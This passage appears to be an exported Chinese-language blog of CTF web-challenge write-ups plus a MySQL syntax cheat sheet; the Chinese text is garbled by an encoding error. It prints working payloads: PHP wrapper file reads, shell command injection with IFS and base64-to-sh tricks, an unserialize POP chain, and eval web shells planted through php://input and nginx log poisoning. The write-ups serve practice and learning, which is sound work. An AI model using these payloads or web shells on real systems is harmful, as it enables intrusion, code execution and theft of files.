<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/testweb/home.php&quot;</span>;</span><br><span class="line"><span class="comment">//æ˜¾ç¤ºå¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="comment">//æ˜¾ç¤ºä¸å¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//è¾“å‡ºç¤ºä¾‹</span></span><br><span class="line">home.php</span><br><span class="line">home</span><br></pre></td></tr></table></figure>

<ul>
<li><p>å…¶ä¸­<code>$_SERVER[&#39;PHP_SELF&#39;]</code>çš„å€¼ä¼šåˆ°<code>basename()</code>å‡½æ•°ä¸­</p>
</li>
<li><p>å…¶ç»•è¿‡åŸç†ä¸ºï¼šåœ¨ä½¿ç”¨é»˜è®¤è¯­è¨€ç¯å¢ƒè®¾ç½®æ—¶ï¼Œ<code>basename()</code> ä¼šåˆ é™¤æ–‡ä»¶åå¼€å¤´çš„é ASCII å­—ç¬¦å’Œä¸­æ–‡ï¼Œ</p>
</li>
<li><p>è¿™å¯ä»¥ç”¨æ¥é€šè¿‡ä¸Šé¢çš„æ­£åˆ™è¿‡æ»¤</p>
<p> urlç¼–ç ç»•show_source</p>
</li>
<li><p>å› ä¸ºå½“æˆ‘ä»¬ä¼ å…¥<code>index.php/utils.php</code>æ—¶ï¼Œä»ç„¶è¯·æ±‚çš„æ˜¯<code>index.php</code>ï¼Œ</p>
</li>
<li><p>ä½†æ˜¯å½“<code>basename()</code>å¤„ç†åï¼Œ<code>highlight_file()</code>å¾—åˆ°çš„å‚æ•°å°±å˜æˆäº†<code>utils.php</code>ï¼Œä»è€Œæˆ‘ä»¬å°±å®ç°äº†ä»»æ„æ–‡ä»¶åŒ…å«</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/utils.php/%ff?%73how_source=1</span><br><span class="line">æˆ–è€…</span><br><span class="line">/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65=1</span><br></pre></td></tr></table></figure>

<h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h2><p>hint is hear Can you find out the hint.php?</p>
<p>getä¼ å‚ä¼ªåè®®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>

<p>PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4&#x3D;</p>
<p>è®¿é—®&#x2F;test2222222222222.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;max_execution_time&quot;, &quot;180&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a= $_GET[&quot;a&quot;];</span><br><span class="line">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class="line">    echo &quot;success\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF-2019-Ping-Ping-Pingå·²è§£å†³"><a href="#GXYCTF-2019-Ping-Ping-Pingå·²è§£å†³" class="headerlink" title="[GXYCTF 2019]Ping Ping Pingå·²è§£å†³"></a>[GXYCTF 2019]Ping Ping Pingå·²è§£å†³</h2><p>è§£æ³•ä¸€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>è§£æ³•ä¸‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;a=ag;b=fl;tac$IFS$9$b$a.php</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">// â€®â¦NISACTFâ©â¦Welcome to</span><br><span class="line">if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;â€®â¦+!!â©â¦&amp; &quot;â€®â¦ Flag!â©â¦N1SACTF&quot; == $_GET[â€®â¦Ugeiwoâ©â¦cuishiyuan]) &#123; //tnnd! weishenme b</span><br><span class="line">    echo $FLAG;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸å¯è§å­—ç¬¦ï¼Œunicodeå­—ç¬¦</p>
<p>å¤åˆ¶åˆ°txtæ–‡æ¡£ä¸­010æ‰“å¼€åå°±æå–16è¿›åˆ¶æ›¿æ¢ç©ºæ ¼ä¸ºç™¾åˆ†å·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF</span><br></pre></td></tr></table></figure>

<h2 id="GKCTF-2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF-2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF 2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF 2020]cveç‰ˆç­¾åˆ°</h2><h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-pop"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-pop" class="headerlink" title="SWPUCTF 2021 æ–°ç”Ÿèµ›]pop"></a>SWPUCTF 2021 æ–°ç”Ÿèµ›]pop</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m;</span><br><span class="line">$b=new w33m;</span><br><span class="line">$c=new w44m;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$b-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="é¹åŸæ¯-2022-ç®€å•åŒ…å«"><a href="#é¹åŸæ¯-2022-ç®€å•åŒ…å«" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•åŒ…å«"></a>[é¹åŸæ¯ 2022]ç®€å•åŒ…å«</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include($_POST[&quot;flag&quot;]);</span><br><span class="line">//flag in /var/www/html/flag.php;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = $_POST[&quot;flag&quot;];</span><br><span class="line">if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123;</span><br><span class="line">    echo &#x27;nssctf waf!&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @include($path);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>postå†…å®¹å¤§äº800å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åƒåœ¾æ•°æ®&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>-nss</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlè¯­æ³•</title>
    <url>/2023/02/16/mysql/</url>
    <content><![CDATA[<p>mysqlè¯­æ³•</p>
  <span id="more"></span>

<p><a href="https://blog.csdn.net/mshxuyi/article/details/88046146">(3æ¡æ¶ˆæ¯) ï¼­ySQL åˆ›å»ºæ•°æ®åº“&#x2F;è¡¨&#x2F;å­—æ®µ_æ•°æ®åº“å»ºè¡¨å­—æ®µ_tom.maçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a href="https://blog.csdn.net/ThinkWon/article/details/106610831">(3æ¡æ¶ˆæ¯) MySQLåˆ é™¤è¡¨çš„ä¸‰ç§æ–¹å¼_mysqlæ€ä¹ˆåˆ é™¤è¡¨_ThinkWonçš„åšå®¢-CSDNåšå®¢</a></p>
<h1 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h1><p>mysql æ•°æ®åº“è¯­æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p  #ç™»é™†mysql å¯†ç ä¸ºç©ºç›´æ¥å›è½¦è¿›å…¥</span><br></pre></td></tr></table></figure>

<p>MySQL ä¿®æ”¹å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;newpasswd&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>1ã€æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼’ã€åˆ›å»ºæ•°æ®åº“ school</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database school default character set utf8 collate utf8_general_ci;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼“ã€è¿›å…¥school æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use school;</span><br></pre></td></tr></table></figure>

<p><strong>4ã€æ˜¾ç¤ºå½“å‰æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| school     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>5ã€åˆ›å»ºç©ºè¡¨ student</p>
<p>mysql&gt; create table student;</p>
<p>6ã€åˆ›å»ºå¸¦å­—æ®µçš„è¡¨ student (id,name,age)</p>
<pre><code>#id æ•´å‹ ä¸»å»º ä¸èƒ½ä¸ºç©º è‡ªåŠ¨å¢é•¿
#name å­—ç¬¦å‹é•¿åº¦50 ä¸èƒ½ä¸ºç©º
#age æ•´å‹ ä¸èƒ½ä¸ºç©º é»˜è®¤å€¼18
 
mysql&gt; create table student(
    -&gt; id int primary key not null auto_increment,
    -&gt; name varchar(50) not null,
    -&gt; age int not null default 18
    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
</code></pre>
<p>7ã€æŸ¥è¯¢æ‰€æœ‰è¡¨</p>
<p>mysql&gt; show tables;</p>
<p>8ã€æŸ¥è¯¢è¡¨ç»“æ„</p>
<pre><code>mysql&gt; desc student;
+-------+-------------+------+-----+---------+----------------+
| Field | Type        | Null | Key | Default | Extra          |
+-------+-------------+------+-----+---------+----------------+
| id    | int(11)     | NO   | PRI | NULL    | auto_increment |
| name  | varchar(50) | NO   |     | NULL    |                |
| age   | int(11)     | NO   |     | 18      |                |
+-------+-------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
</code></pre>
<p>9ã€æŸ¥è¯¢è¡¨çš„è¯¦ç»†ä¿¡æ¯</p>
<pre><code>mysql&gt; show create table student;
</code></pre>
<p>10ã€æ’å…¥æ•°æ®</p>
<pre><code>mysql&gt; insert into student (name,age) values
     &gt; (&#39;tom&#39;,20),
     &gt; (&#39;alice&#39;,16),
     &gt; (&#39;helen&#39;,22);
</code></pre>
<p>11ã€æ¸…ç©ºæ•°æ®è¡¨å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">truncate table student;</span><br></pre></td></tr></table></figure>

<p>12ã€å¤åˆ¶è¡¨ç»“æ„ï¼Œè¡¨æ•°æ®</p>
<pre><code>#æ–¹æ³•ä¸€
mysql&gt; create table student_2 like student;  #åˆ›å»ºstudent_2è¡¨ å¹¶å¤åˆ¶studentè¡¨ç»“æ„
mysql&gt; insert into student_2 select * from student;  #å¤åˆ¶studentè¡¨æ•°æ®åˆ°student_2ä¸­
 
#æ–¹æ³•äºŒ
create table student3 select * from student;  #åˆ›å»º student3 å¹¶å¤åˆ¶studentè¡¨ç»“æ„å’Œæ•°æ®
</code></pre>
<p>13ã€é‡å‘½åè¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename table student_3 to student_4  #é‡å‘½åè¡¨ä¸ºstudent_4</span><br></pre></td></tr></table></figure>

<p>14.åˆ é™¤ user è¡¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table user;    #drop æ˜¯ç›´æ¥åˆ é™¤è¡¨ä¿¡æ¯ï¼Œé€Ÿåº¦æœ€å¿«ï¼Œä½†æ˜¯æ— æ³•æ‰¾å›æ•°æ®</span><br><span class="line">truncate table user;   #truncate æ˜¯åˆ é™¤è¡¨æ•°æ®ï¼Œä¸åˆ é™¤è¡¨çš„ç»“æ„ï¼Œä½†ä¸èƒ½ä¸whereä¸€èµ·ä½¿ç”¨</span><br><span class="line">delete from user;   #delete æ˜¯åˆ é™¤è¡¨ä¸­çš„æ•°æ®ï¼Œä¸åˆ é™¤è¡¨ç»“æ„</span><br><span class="line">delete from user where user_id = 1;  </span><br></pre></td></tr></table></figure>

<p>15.ä¿®æ”¹å­—æ®µå†…å®¹</p>
<p>å°†nameä¸ºtomçš„è®°å½•çš„ageè®¾ç½®ä¸º20å¹¶å°†å…¶genderè®¾ç½®ä¸ºfemale MySQLå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update student set age=20,gender=&#x27;female&#x27; where name=&#x27;tom&#x27;;</span><br></pre></td></tr></table></figure>

<p>load_file(file_name)</p>
<p>å…¶ä¸­file_nameæ˜¯æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚</p>
<p>ä¸‹é¢æ˜¯æˆ‘ä»ä¸€ä¸ªæ–‡ä»¶ä¸­é€‰æ‹©å†…å®¹çš„ç¤ºä¾‹:</p>
<p>select load_file(â€˜&#x2F;data&#x2F;test.txtâ€™) as result;</p>
<p><strong>IFè¡¨è¾¾å¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ expr1 æ˜¯TRUE (æˆ–è€…expr1 &lt;&gt; 0 ä¸” expr1 &lt;&gt; NULL)ï¼Œåˆ™ IF()çš„è¿”å›å€¼ä¸ºexpr2; å¦åˆ™è¿”å›å€¼åˆ™ä¸º expr3ã€‚IF() çš„è¿”å›å€¼ä¸ºæ•°å­—å€¼æˆ–å­—ç¬¦ä¸²å€¼ï¼Œå…·ä½“æƒ…å†µè§†å…¶æ‰€åœ¨è¯­å¢ƒè€Œå®šã€‚</p>
<p>substrå‡½æ•°æ ¼å¼ (ä¿—ç§°ï¼šå­—ç¬¦æˆªå–å‡½æ•°)</p>
<p>æ ¼å¼1ï¼š substr(string str, int a, int b);<br>æ ¼å¼2ï¼š substr(string str, int a) ;</p>
<p>è§£é‡Šï¼š</p>
<p>æ ¼å¼1ï¼š<br>    1ã€str éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²<br>    2ã€a   æˆªå–å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®<br>    ï¼ˆæ³¨ï¼šå½“aç­‰äº1æ—¶ï¼Œä»ç¬¬ä¸€ä½å¼€å§‹æˆªå–;å½“aç­‰äº0æ—¶ï¼Œæ— æˆªå–å­—ç¬¦ä¸²ï¼‰<br>    3ã€b   è¦æˆªå–çš„å­—ç¬¦ä¸²çš„é•¿åº¦</p>
<p>æ ¼å¼2ï¼š<br>    1ã€str éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²<br>    2ã€a   å¯ä»¥ç†è§£ä¸ºä»ç¬¬aä¸ªå­—ç¬¦å¼€å§‹æˆªå–åé¢æ‰€æœ‰çš„å­—ç¬¦ä¸²ã€‚</p>
<p>SQLå‡½æ•°Group_concatç”¨æ³•</p>
<p>æ‹¼æ¥å­—ç¬¦ä¸²</p>
<p><a href="https://blog.csdn.net/qq_35531549/article/details/90383022">(6æ¡æ¶ˆæ¯) SQLå‡½æ•°Group_concatç”¨æ³•_group_concat sql_å¯¸è‰å¿ƒ2130çš„åšå®¢-CSDNåšå®¢</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>phpä¼ªåè®®</title>
    <url>/2023/01/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><code>php://input</code></p>
<p><code>data://text/plain</code>,xxxx</p>
<p><code>php://filter</code></p>
  <span id="more"></span>

<p>PHPå¸¸è§çš„ä¼ªåè®®å¦‚ä¸‹ï¼š</p>
<p>æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>æ–‡ä»¶è¯»å–å‡½æ•°ï¼š</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
<table>
<thead>
<tr>
<th>file:&#x2F;&#x2F; è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</th>
</tr>
</thead>
<tbody><tr>
<td>http:&#x2F;&#x2F; è®¿é—®HTTP(s)ç½‘å€</td>
</tr>
<tr>
<td>ftp:&#x2F;&#x2F; è®¿é—®FTP(s)URLs</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F; è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ(I&#x2F;O streams)</td>
</tr>
<tr>
<td>zlib:&#x2F;&#x2F; å‹ç¼©æµ</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F; æ•°æ®(RFC 2397)</td>
</tr>
<tr>
<td>glob:&#x2F;&#x2F; æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F; PHPå½’æ¡£</td>
</tr>
<tr>
<td>ssh2:&#x2F;&#x2F; Secure Shell 2</td>
</tr>
<tr>
<td>rar:&#x2F;&#x2F; RAR</td>
</tr>
<tr>
<td>ogg:&#x2F;&#x2F; éŸ³é¢‘æµ</td>
</tr>
<tr>
<td>expect:&#x2F;&#x2F; å¤„ç†äº¤äº’å¼çš„æµ</td>
</tr>
</tbody></table>
<p>åœ¨è¿™é‡Œè¯¦ç»†è¯´ä¸€ä¸‹è¿™ä¸ª<code>php://filter</code></p>
<p>,è¿™ä¸ªæ˜¯å¸¸ç”¨çš„ä¼ªåè®®ï¼Œä¸€èˆ¬ç”¨äºä»»æ„æ–‡ä»¶è¯»å–ï¼Œæœ‰çš„æ—¶å€™ä¹Ÿå¯ä»¥ç”¨åœ¨getshellï¼Œåœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p>åœ¨è¿™é‡Œä¸¾ä¸ªä¾‹å­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>å…³äºä¸Šé¢è¿™ä¸ªï¼Œè§£é‡Šä¸€ä¸‹ï¼Œé¦–å…ˆfileå…³é”®å­—çš„getå‚æ•°ä¼ é€’ï¼Œphp:&#x2F;&#x2F;æ˜¯ä¸€ç§åè®®åç§°ï¼Œphp:&#x2F;&#x2F;filter&#x2F;æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ&#x2F;read&#x3D;convert.base64-encode&#x2F;è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯base64ç¼–ç åï¼Œresourse&#x3D;index.phpè¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚</p>
<p>ä¸Šé¢ä¸¾çš„å¸¸ç”¨çš„ä¼ªåè®®çš„ç”¨æ³•ï¼š</p>
<p>1.phpä¼ªåè®®<br>ç”¨æ³•ï¼š<br><code>php://input</code>,ç”¨äºæ‰§è¡Œphpä»£ç ï¼Œéœ€è¦postè¯·æ±‚æäº¤æ•°æ®ã€‚</p>
<p><strong>php:&#x2F;&#x2F;input</strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>éœ€è¦å¼€å¯allow_url_fopen:php:&#x2F;&#x2F;inputã€php:&#x2F;&#x2F;stdinã€php:&#x2F;&#x2F;memoryã€php:&#x2F;&#x2F;temp<br>ä¸éœ€è¦å¼€å¯allow_url_fopen:php:&#x2F;&#x2F;filter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATAéƒ¨åˆ†]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>2.ã€dataåè®®</p>
<p>ç”¨æ³•ï¼š<br><code>data://text/plain</code>,xxxx(è¦æ‰§è¡Œçš„phpä»£ç )<br><code>data://text/plain;base64</code>,xxxx(base64ç¼–ç åçš„æ•°æ®)<br>ä¾‹ï¼š<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p>
<p>3.ã€fileåè®®<br>ç”¨æ³•ï¼š<br><code>file://</code>[æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„ç»å¯¹è·¯å¾„]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=file:///etc/passsword</span><br></pre></td></tr></table></figure>

<p>ä¸‰ä¸ª&#x2F; ç¬¬ä¸‰ä¸ªæ æ˜¯æ ¹ç›®å½•ä¸Šçš„æ </p>
<p><a href="https://segmentfault.com/a/1190000018991087">PHPä¼ªåè®®æ€»ç»“ - ä¸ªäººæ–‡ç«  - SegmentFault æ€å¦</a></p>
<p>ctfshow</p>
<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?=`tac f*`;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•ä¸€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a10018ad-9503-4957-9de2-24a693837991.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ua å¤´å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">1=system(&quot;tac f*&quot;);  //postä¼ å…¥</span><br></pre></td></tr></table></figure>

<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠå†’å·è¿‡æ»¤äº†ä¼ªåè®®ç”¨ä¸äº†</p>
<p>è§£æ³•ä¸€ï¼šæ—¥å¿—åŒ…å«å’Œä¸Šé¢˜ä¸€æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://167c670e-4138-48aa-9480-9f484963d114.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo`tac f*`;?&gt;  //uaä¼ å…¥</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>n1book</title>
    <url>/2023/03/10/n1book/</url>
    <content><![CDATA[<p>buu n1book</p>
